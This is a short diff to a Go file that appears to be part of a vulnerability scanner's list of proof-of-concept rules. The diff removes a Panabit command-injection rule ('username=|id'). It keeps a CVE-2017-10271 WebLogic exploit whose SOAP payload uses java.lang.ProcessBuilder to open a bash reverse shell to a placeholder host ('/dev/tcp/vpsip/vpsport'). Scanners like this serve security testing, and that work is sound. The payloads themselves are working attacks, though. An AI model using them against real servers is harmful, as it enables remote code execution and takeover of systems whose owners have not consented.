@@ -52,6 +52,5 @@ func GetRule() {
 }
 
 var PocRules = []PocRule{
-	{"1", "Panabit RCE", "POST", "/account/sy_addmount.php", nil, "username=|id", "body", Instr{[]string{"uid="}, nil}},
 	{"1", "CVE-2017-10271", "POST", "/wls-wsat/CoordinatorPortType", map[string]string{"Content-Type": "text/xml;charset=UTF-8", "User-Agent": "TestUA/1.0"}, "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">   \n<soapenv:Header> \n<wsa:Action>xx</wsa:Action>\n<wsa:RelatesTo>xx</wsa:RelatesTo>\n<work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n<void class=\"java.lang.ProcessBuilder\">\n<array class=\"java.lang.String\" length=\"3\">\n<void index=\"0\">\n<string>/bin/bash</string>\n</void>\n<void index=\"1\">\n<string>-c</string>\n</void>\n<void index=\"2\">\n<string>bash -i &gt;&amp; /dev/tcp/vpsip/vpsport 0&gt;&amp;1</string>\n</void>\n</array>\n<void method=\"start\"/></void>\n</work:WorkContext>\n</soapenv:Header>\n<soapenv:Body>\n<asy:onAsyncDelivery/>\n</soapenv:Body></soapenv:Envelope>", "bodyor", Instr{BodyStr: []string{"<faultstring>java.lang.ProcessBuilder", "java.util.NoSuchElementException"}, HeaderStr: nil}},
 }
